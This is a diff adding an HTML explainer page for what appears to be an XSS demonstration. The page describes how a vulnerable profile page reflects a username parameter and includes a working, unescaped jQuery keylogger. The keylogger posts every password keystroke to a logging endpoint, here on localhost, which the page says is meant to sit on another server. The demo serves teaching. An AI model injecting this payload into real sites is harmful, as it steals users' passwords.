@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>How it works</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+</head>
+<body>
+
+<div class="container-fluid bg-3 text-center">
+    
+    <div id="username" ></div>
+    <div class="panel panel-default col-md-6 col-md-offset-3" style="width:50%">
+        <div class="panel-heading"><h1>How it works</h1></div>
+        <div class="panel-body">
+            <p>profile.html is a demo page that lets a user change their password by entering a new password and confirming it</p>
+            <p>There is a get request with a username variable. The variable data is displayed in an invisible div</p>
+            <p>The page is vulnerable to an injection.</p>
+            <p>The below javascript is injected into the page via the get request</p>
+            <p>The script does the following: </p>
+            <p>Every time the user types a character into any password input the character is saved in a log file.</p>
+            <p>For the purpose of this demo, the log file is on the same localhost, but the objective is to save the characters in the log file on a different server</p>
+           
+               
+                <code>
+                   
+                    <script>
+                        result="";
+                        $(":password").keypress(function(e) {
+                            result=String.fromCharCode(e.which);
+                            $.post('http://localhost/keylogger/keylogger.php',{"logged_key":result,"victim":"test-victim"}, function(data){});
+                        });
+                    </script>
+                   
+                </code>
+                
+        
+        </div>
+    </div>
+
+</div>
+
+</body>
+</html>
